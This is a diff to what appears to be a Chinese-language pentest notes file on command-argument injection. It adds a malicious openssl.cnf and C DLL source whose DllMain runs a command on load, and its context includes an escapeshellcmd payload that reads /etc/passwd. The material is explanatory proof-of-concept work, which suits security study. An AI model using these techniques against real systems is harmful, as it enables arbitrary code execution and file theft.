@@ -323,6 +323,53 @@ $url = 'enc -in /etc/passwd -out /tmp/xxx';
 system(escapeshellcmd('openssl '.$url));
 ```
 
+openssl配置文件可控时，可调用恶意so或dll:
+[https://hackerone.com/reports/622170](https://hackerone.com/reports/622170)
+
+openssl.cnf
+
+```shell
+# Malicious openssl.cnf
+openssl_conf = openssl_init
+[openssl_init]
+engines = engine_section
+
+[engine_section]
+cmd = cmd_section
+
+[cmd_section]
+engine_id = cmd
+dynamic_path = c:\\usr\\local\\ssl\\calc.dll
+init = 0
+```
+
+恶意dll
+
+```c
+#include <windows.h>
+BOOL WINAPI DllMain(
+    HINSTANCE hinstDLL,
+    DWORD fdwReason,
+    LPVOID lpReserved )
+{
+    switch( fdwReason )
+    {
+        case DLL_PROCESS_ATTACH:
+            system("cmd /c calc.exe");
+            break;
+        case DLL_THREAD_ATTACH:
+         // Do thread-specific initialization.
+            break;
+        case DLL_THREAD_DETACH:
+         // Do thread-specific cleanup.
+            break;
+        case DLL_PROCESS_DETACH:
+         // Perform any necessary cleanup.
+            break;
+    }
+    return TRUE;  // Successful DLL_PROCESS_ATTACH.
+}
+```
 
 
 还有很多命令都有`-o`之类的参数，实在利用不了的话可以注入这种参数，可以作为任意文件覆盖。
